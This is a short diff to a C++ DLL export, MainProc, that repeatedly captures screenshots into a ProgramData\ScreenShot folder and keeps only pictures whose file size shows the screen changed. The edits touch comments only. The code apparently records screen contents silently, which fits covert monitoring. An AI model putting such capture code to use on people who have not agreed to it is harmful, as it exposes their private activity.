@@ -77,7 +77,7 @@ extern "C" __declspec(dllexport) DWORD MainProc
 	WCHAR pddir[MAX_PATH] = L"*:\\ProgramData\\";
 	WCHAR ssdir[MAX_PATH] = L"*:\\ProgramData\\ScreenShot\\";
 	GetSystemDirectoryW(sysdir,sizeof(sysdir));
-	//Set directories names
+	//Set directory names
 	pddir[0] = sysdir[0];
 	ssdir[0] = sysdir[0];
 	//Create screenshots
@@ -106,13 +106,13 @@ extern "C" __declspec(dllexport) DWORD MainProc
 		//Compare with last pictures
 		if(lfs==0)
 		{
+			//This is the first screenshot
 			lfs = GetFileSizeW(path);
 			RenameExtNameToPNG(path);
 		}
 		else
 		{
-			//If the file size between 2 files are almost the same
-			//It means the screen has not changed basically
+			//If the size between 2 files are almost the same, it means the screen has not changed
 			__int64 cfs = GetFileSizeW(path);
 			if(abs(lfs - cfs) < 1024)
 			{
